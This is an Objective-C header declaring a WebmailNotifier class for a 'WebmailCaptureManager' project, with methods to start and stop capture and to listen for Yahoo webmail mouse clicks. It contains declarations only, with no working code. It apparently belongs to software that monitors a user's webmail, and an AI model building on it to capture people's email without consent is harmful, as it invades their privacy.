//
//  WebmailNotifier.h
//  WebmailCaptureManager
//
//  Created by ophat on 2/6/15.
//  Copyright (c) 2015 ophat. All rights reserved.
//

#import <Foundation/Foundation.h>

#import "PageVisitedDelegate.h"

@class AsyncController, PageValueChangeNotifier;

@interface WebmailNotifier : NSObject <PageVisitedDelegate> {
@private
    AsyncController *mAsyC;
    PageValueChangeNotifier *mPageNotifier;
    NSOperationQueue *mQueue;
    
    NSString * mAddonName;
    NSString * mAddonPlist;
    
    id mMouseEventHandler;
    id mForceAliveMouseEventHandler;
}

@property (nonatomic, copy) NSString *mAddonName;
@property (nonatomic, copy) NSString *mAddonPlist;

@property (nonatomic, retain) id mMouseEventHandler;
@property (nonatomic, retain) id mForceAliveMouseEventHandler;

- (void) startCapture;
- (void) stopCapture;

- (void) registerYahooMouseClickListenerWithApp:(NSString *) aAppName;
- (void) unregisterYahooMouseClickListener;

@end
